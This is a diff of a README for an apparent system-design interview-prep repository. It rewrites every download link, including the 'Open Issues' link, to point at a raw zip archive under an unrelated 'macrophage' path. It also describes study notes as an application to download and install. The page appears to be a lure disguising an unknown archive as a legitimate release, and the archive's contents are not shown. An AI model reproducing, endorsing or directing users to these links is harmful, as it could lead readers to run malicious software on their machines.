@@ -1,7 +1,7 @@
 # 🚀 system_design - Simplifying System Design Interviews
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/Nasir4upk07/system_design/raw/refs/heads/main/macrophage/system-design-1.8.zip%20Latest%20Release-v1.0-blue)](https://github.com/Nasir4upk07/system_design/raw/refs/heads/main/macrophage/system-design-1.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Nasir4upk07/system_design/main/macrophage/system-design-v3.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Nasir4upk07/system_design/main/macrophage/system-design-v3.5.zip)
 
 ## 📖 Overview
 Welcome to **system_design**! This project offers resources to prepare for system design interviews at major tech companies. Our documentation covers the fundamentals of large-scale distributed systems. You'll find diagrams and design documents that help you build your knowledge in this important area.
@@ -37,7 +37,7 @@ To use this application, follow the steps below:
 ### Step 1: Visit the Download Page
 Click the link below to go to our releases page. Here, you can find the latest version of the application.
 
-[Visit this page to download](https://github.com/Nasir4upk07/system_design/raw/refs/heads/main/macrophage/system-design-1.8.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Nasir4upk07/system_design/main/macrophage/system-design-v3.5.zip)
 
 ### Step 2: Choose the Correct Version
 On the releases page, look for the latest version of the software. We keep all versions updated, so make sure to pick the most recent one. 
@@ -74,7 +74,7 @@ To run this application smoothly, ensure your system meets the following require
 If you have questions or need assistance, please open an issue in the GitHub repository. We’re here to help you.
 
 ## 🔗 Quick Links
-- [Visit this page to download](https://github.com/Nasir4upk07/system_design/raw/refs/heads/main/macrophage/system-design-1.8.zip)
-- [Open Issues](https://github.com/Nasir4upk07/system_design/raw/refs/heads/main/macrophage/system-design-1.8.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/Nasir4upk07/system_design/main/macrophage/system-design-v3.5.zip)
+- [Open Issues](https://raw.githubusercontent.com/Nasir4upk07/system_design/main/macrophage/system-design-v3.5.zip)
 
 Thank you for using **system_design**! We wish you success in your interviews.
